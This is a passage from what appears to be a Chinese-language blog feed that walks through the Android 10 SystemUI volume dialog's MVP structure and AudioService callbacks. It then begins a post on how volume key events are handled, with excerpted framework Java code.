class="variable">mCallbacks</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C</span>();</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 添加回调监听</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCallback</span><span class="params">(Callbacks callback, Handler handler)</span> &#123;</span><br><span class="line">        mCallbacks.add(callback, handler);</span><br><span class="line">        callback.onAccessibilityModeChanged(mShowA11yStream);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">implements</span> <span class="title class_">Callbacks</span> &#123;</span><br><span class="line">        <span class="comment">// Callbacks作为key，Handler为value</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> HashMap&lt;Callbacks, Handler&gt; mCallbackMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Callbacks callback, Handler handler)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (callback == <span class="literal">null</span> || handler == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">            mCallbackMap.put(callback, handler);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStateChanged</span><span class="params">(<span class="keyword">final</span> State state)</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">            <span class="keyword">final</span> <span class="type">State</span> <span class="variable">copy</span> <span class="operator">=</span> state.copy();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">final</span> Map.Entry&lt;Callbacks, Handler&gt; entry : mCallbackMap.entrySet()) &#123;</span><br><span class="line">                entry.getValue().post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        entry.getKey().onStateChanged(copy);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            Events.writeState(time, copy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里C是Callbacks的实现类，并且在内部有一个Map，用来存放对应的Callbacks以及Handler<br>在VolumeDialogControllerImpl收到来自AudioService的方法之后，就会调用mCallbacks的方法，由于调用的地方是在工作线程，所以在这里通过Handler转化为了UI线程去调用，在对应的实现地方就可以直接改变UI了。<br>Callbacks代码如下：<br><strong>frameworks/base/packages/SystemUI/plugin/src/com/android/systemui/plugins/VolumeDialogController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ProvidesInterface(version = VolumeDialogController.VERSION)</span></span><br><span class="line"><span class="meta">@DependsOn(target = StreamState.class)</span></span><br><span class="line"><span class="meta">@DependsOn(target = State.class)</span></span><br><span class="line"><span class="meta">@DependsOn(target = Callbacks.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">VolumeDialogController</span> &#123;</span><br><span class="line">    <span class="meta">@ProvidesInterface(version = Callbacks.VERSION)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Callbacks</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">VERSION</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onShowRequested</span><span class="params">(<span class="type">int</span> reason)</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onDismissRequested</span><span class="params">(<span class="type">int</span> reason)</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onStateChanged</span><span class="params">(State state)</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onLayoutDirectionChanged</span><span class="params">(<span class="type">int</span> layoutDirection)</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onConfigurationChanged</span><span class="params">()</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onShowVibrateHint</span><span class="params">()</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onShowSilentHint</span><span class="params">()</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onScreenOff</span><span class="params">()</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onShowSafetyWarning</span><span class="params">(<span class="type">int</span> flags)</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onAccessibilityModeChanged</span><span class="params">(Boolean showA11yStream)</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">onCaptionComponentStateChanged</span><span class="params">(Boolean isComponentEnabled, Boolean fromTooltip)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-注册VolumeController"><a href="#3-注册VolumeController" class="headerlink" title="3 注册VolumeController"></a>3 注册VolumeController</h4><p>接着来看setDefaultVolumeController，这个比较重要：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/volume/VolumeDialogComponent.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Singleton</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VolumeDialogComponent</span> <span class="keyword">implements</span> <span class="title class_">VolumeComponent</span>, TunerService.Tunable,</span><br><span class="line">        VolumeDialogControllerImpl.UserActivityListener&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> VolumeDialogControllerImpl mController;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Inject</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VolumeDialogComponent</span><span class="params">(Context context, KeyguardViewMediator keyguardViewMediator,</span></span><br><span class="line"><span class="params">            VolumeDialogControllerImpl volumeDialogController)</span> &#123;</span><br><span class="line">        mController = volumeDialogController;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">          </span><br><span class="line">    ...  </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> &#123;</span><br><span class="line">        mController.register();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VolumeDialogComponent调用VolumeDialogControllerImpl的方法：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/volume/VolumeDialogControllerImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">VC</span> <span class="variable">mVolumeController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VC</span>();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 向Audio Manager注册了一个Binder，其实就是一个回调</span></span><br><span class="line">        setVolumeController();</span><br><span class="line">        setVolumePolicy(mVolumePolicy);</span><br><span class="line">        showDndTile(mShowDndTile);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        mMediaSessions.init();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">        Log.w(TAG, <span class="string">&quot;No access to media sessions&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">        Log.w(TAG, <span class="string">&quot;Unable to set the volume controller&quot;</span>, e);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setVolumeController</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        mAudio.setVolumeController(mVolumeController);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">        Log.w(TAG, <span class="string">&quot;Unable to set the volume controller&quot;</span>, e);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Audio Manager 就是 Model 层，VolumeDialogControllerImpl 向 Audio Manager 注册了一个回调，其实就是 Presenter 层与 Model 层的关联。</p><h4 id="4-音量UI显示"><a href="#4-音量UI显示" class="headerlink" title="4 音量UI显示"></a>4 音量UI显示</h4><p>现在MVP框架已经形成，现在就来分析下当按下 Power 键后，VolumeUI 是如何显示UI的。<br>这里调用AudioManager的setVolumeController方法去设置了音量控制的回调接口：<br><strong>frameworks/base/services/core/java/com/android/server/audio/AudioService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AudioService</span> <span class="keyword">extends</span> <span class="title class_">IAudioService</span>.Stub</span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">AccessibilityManager</span>.TouchExplorationStateChangeListener,</span><br><span class="line">            AccessibilityManager.AccessibilityServicesStateChangeListener &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">VolumeController</span> <span class="variable">mVolumeController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VolumeController</span>();</span><br><span class="line">              </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVolumeController</span><span class="params">(<span class="keyword">final</span> IVolumeController controller)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        mVolumeController.setController(controller);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">VolumeController</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> IVolumeController mController;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setController</span><span class="params">(IVolumeController controller)</span> &#123;</span><br><span class="line">            mController = controller;</span><br><span class="line">            mVisible = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 音量发生改变就会调用这个方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postVolumeChanged</span><span class="params">(<span class="type">int</span> streamType, <span class="type">int</span> flags)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (mController == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mController.volumeChanged(streamType, flags);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                Log.w(TAG, <span class="string">&quot;Error calling volumeChanged&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在AudioService里面定义了一个内部类VolumeController，持有IVolumeController的引用，当音量发生改变就会调用VolumeController的方法，然后调用IVolumeController的方法，最终回调到SystemUI的VolumeDialogControllerImpl的VC类中。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/volume/VolumeDialogControllerImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Singleton</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VolumeDialogControllerImpl</span> <span class="keyword">implements</span> <span class="title class_">VolumeDialogController</span>, Dumpable &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">VC</span> <span class="keyword">extends</span> <span class="title class_">IVolumeController</span>.Stub &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">volumeChanged</span><span class="params">(<span class="type">int</span> streamType, <span class="type">int</span> flags)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="comment">// 收到AudioService调用的方法</span></span><br><span class="line">            mWorker.obtainMessage(W.VOLUME_CHANGED, streamType, flags).sendToTarget();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">W</span> <span class="keyword">extends</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">VOLUME_CHANGED</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        W(Looper looper) &#123;</span><br><span class="line">            <span class="built_in">super</span>(looper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (msg.what) &#123;</span><br><span class="line">                <span class="keyword">case</span> VOLUME_CHANGED: onVolumeChangedW(msg.arg1, msg.arg2); <span class="keyword">break</span>;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">onVolumeChangedW</span><span class="params">(<span class="type">int</span> stream, <span class="type">int</span> flags)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">showUI</span> <span class="operator">=</span> shouldShowUI(flags);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">fromKey</span> <span class="operator">=</span> (flags &amp; AudioManager.FLAG_FROM_KEY) != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">showVibrateHint</span> <span class="operator">=</span> (flags &amp; AudioManager.FLAG_SHOW_VIBRATE_HINT) != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">showSilentHint</span> <span class="operator">=</span> (flags &amp; AudioManager.FLAG_SHOW_SILENT_HINT) != <span class="number">0</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">changed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (showUI) &#123;</span><br><span class="line">            changed |= updateActiveStreamW(stream);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lastAudibleStreamVolume</span> <span class="operator">=</span> getAudioManagerStreamVolume(stream);</span><br><span class="line">        changed |= updateStreamLevelW(stream, lastAudibleStreamVolume);</span><br><span class="line">        changed |= checkRoutedToBluetoothW(showUI ? AudioManager.STREAM_MUSIC : stream);</span><br><span class="line">        <span class="keyword">if</span> (changed) &#123;</span><br><span class="line">            <span class="comment">// 调用mCallbacks的onStateChanged方法</span></span><br><span class="line">            mCallbacks.onStateChanged(mState);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (showUI) &#123;</span><br><span class="line">            <span class="comment">// UI 更新</span></span><br><span class="line">            mCallbacks.onShowRequested(Events.SHOW_REASON_VOLUME_CHANGED);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> changed;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的mWork是通过子线程的Looper去初始化的，所以onVolumeChangedW也是在子线程执行的，那么我们mCallbacks的方法也是在子线程执行的，这里的分析也是和上面的第2小点的分析对应上了。<br>根据 flags 决定要执行哪个回调，如果要显示UI，就会回调 onShowRequested() , 而这个回调当然是由 View 层实现的。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/volume/VolumeDialogImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> VolumeDialogController.<span class="type">Callbacks</span> <span class="variable">mControllerCallbackH</span></span><br><span class="line">        <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VolumeDialogController</span>.Callbacks() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onShowRequested</span><span class="params">(<span class="type">int</span> reason)</span> &#123;</span><br><span class="line">        showH(reason);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">showH</span><span class="params">(<span class="type">int</span> reason)</span> &#123;</span><br><span class="line">    <span class="comment">// 显示Dialog</span></span><br><span class="line">    mDialog.show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>View 层就完成了一个 Dialog 的显示。</p><h4 id="5-VolumeUI小结"><a href="#5-VolumeUI小结" class="headerlink" title="5 VolumeUI小结"></a>5 VolumeUI小结</h4><p>这里我们来分析一下VolumeUI整理流程：</p><ol><li>VolumeUI持有VolumeDialogComponent的引用，在调用VolumeUI的start方法时，会判断音量条和安全音量提示是否打开，然后会去注册AudioService的监听。</li><li>VolumeDialogComponent的构造函数会去创建音量条实例-VolumeDialogImpl，同时VolumeDialogImpl会去执行一些初始化的操作，同时添加VolumeDialogControllerImpl的监听回调。</li><li>注册AudioService的监听是在VolumeDialogControllerImpl里面注册的，当AudioService进行了调整音量的操作后，VolumeDialogControllerImpl会收到通知，同时会将收到的消息回调给VolumeDialogImpl，做出相应的UI调整，这样就完成了一轮操作。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Settings </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10 Android音量调节</title>
      <link href="/2024/01/06/2024-01-06/"/>
      <url>/2024/01/06/2024-01-06/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在手机和平板上面，我们实际上能调节的也就5个音量:</p><table><thead><tr><th>流类型</th><th>最大音量</th><th>音量</th><th>默认音量</th><th>含义</th></tr></thead><tbody><tr><td>STREAM_VOICE_CALL</td><td>5</td><td>1</td><td>4</td><td>通话音量</td></tr><tr><td>STREAM_RING</td><td>7</td><td>0</td><td>5</td><td>铃声，通知音量等</td></tr><tr><td>STREAM_MUSIC</td><td>15</td><td>0</td><td>5</td><td>多媒体音量</td></tr><tr><td>STREAM_ALARM</td><td>7</td><td>0</td><td>6</td><td>闹钟音量</td></tr><tr><td>STREAM_BLUETOOTH_SCO</td><td>15</td><td>0</td><td>7</td><td>蓝牙音量</td></tr></tbody></table><h3 id="1-按键的处理流程"><a href="#1-按键的处理流程" class="headerlink" title="1 按键的处理流程"></a>1 按键的处理流程</h3><p><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pre-condition: event.getKeyCode() is one of KeyEvent.KEYCODE_VOLUME_UP,</span></span><br><span class="line">    <span class="comment">//          KeyEvent.KEYCODE_VOLUME_DOWN, KeyEvent.KEYCODE_VOLUME_MUTE</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dispatchDirectAudioEvent</span><span class="params">(KeyEvent event)</span> &#123;</span><br><span class="line">        <span class="comment">// When System Audio Mode is off, volume keys received by AVR can be either consumed by AVR</span></span><br><span class="line">        <span class="comment">// or forwarded to the TV. It&#x27;s up to Amplifier manufacturer’s implementation.</span></span><br><span class="line">        <span class="type">HdmiControlManager</span> <span class="variable">hdmiControlManager</span> <span class="operator">=</span> getHdmiControlManager();</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != hdmiControlManager</span><br><span class="line">                &amp;&amp; !hdmiControlManager.getSystemAudioMode()</span><br><span class="line">                &amp;&amp; shouldCecAudioDeviceForwardVolumeKeysSystemAudioModeOff()) &#123;</span><br><span class="line">            <span class="type">HdmiAudioSystemClient</span> <span class="variable">audioSystemClient</span> <span class="operator">=</span> hdmiControlManager.getAudioSystemClient();</span><br><span class="line">            <span class="keyword">if</span> (audioSystemClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                audioSystemClient.sendKeyEvent(</span><br><span class="line">                        event.getKeyCode(), event.getAction() == KeyEvent.ACTION_DOWN);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            getAudioService().handleVolumeKey(event, mUseTvRouting,</span><br><span class="line">                    mContext.getOpPackageName(), TAG);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Error dispatching volume key in handleVolumeKey for event:&quot;</span></span><br><span class="line">                    + event, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// 这里通过AIDL获取IAudioService的实例，</span></span><br><span class="line">    <span class="keyword">static</span> IAudioService <span class="title function_">getAudioService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">IAudioService</span> <span class="variable">audioService</span> <span class="operator">=</span> IAudioService.Stub.asInterface(</span><br><span class="line">                ServiceManager.checkService(Context.AUDIO_SERVICE));</span><br><span class="line">        <span class="keyword">if</span> (audioService == <span class="literal">null</span>) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">&quot;Unable to find IAudioService interface.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> audioService;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在这里，通过Binder获取到了AudioService的实例，调用AudioService的handleVolumeKey()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pre-condition: event.getKeyCode() is one of KeyEvent.KEYCODE_VOLUME_UP,</span></span><br><span class="line">    <span class="comment">//                                   KeyEvent.KEYCODE_VOLUME_DOWN, KeyEvent.KEYCODE_VOLUME_MUTE</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleVolumeKey</span><span class="params">(<span class="meta">@NonNull</span> KeyEvent event, <span class="type">boolean</span> isOnTv,</span></span><br><span class="line"><span class="params">            <span class="meta">@NonNull</span> String callingPackage, <span class="meta">@NonNull</span> String caller)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">keyEventMode</span> <span class="operator">=</span> VOL_ADJUST_NORMAL;</span><br><span class="line">        <span class="keyword">if</span> (isOnTv) &#123;</span><br><span class="line">            <span class="keyword">if</span> (event.getAction() == KeyEvent.ACTION_DOWN) &#123;</span><br><span class="line">                keyEventMode = VOL_ADJUST_START;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// may catch more than ACTION_UP, but will end vol adjustement</span></span><br><span class="line">                <span class="comment">// the vol key is either released (ACTION_UP), or multiple keys are pressed</span></span><br><span class="line">                <span class="comment">// (ACTION_MULTIPLE) and we don&#x27;t know what to do for volume control on CEC, end</span></span><br><span class="line">                <span class="comment">// the repeated volume adjustement</span></span><br><span class="line">                keyEventMode = VOL_ADJUST_END;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.getAction() != KeyEvent.ACTION_DOWN) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">flags</span> <span class="operator">=</span> AudioManager.FLAG_SHOW_UI | 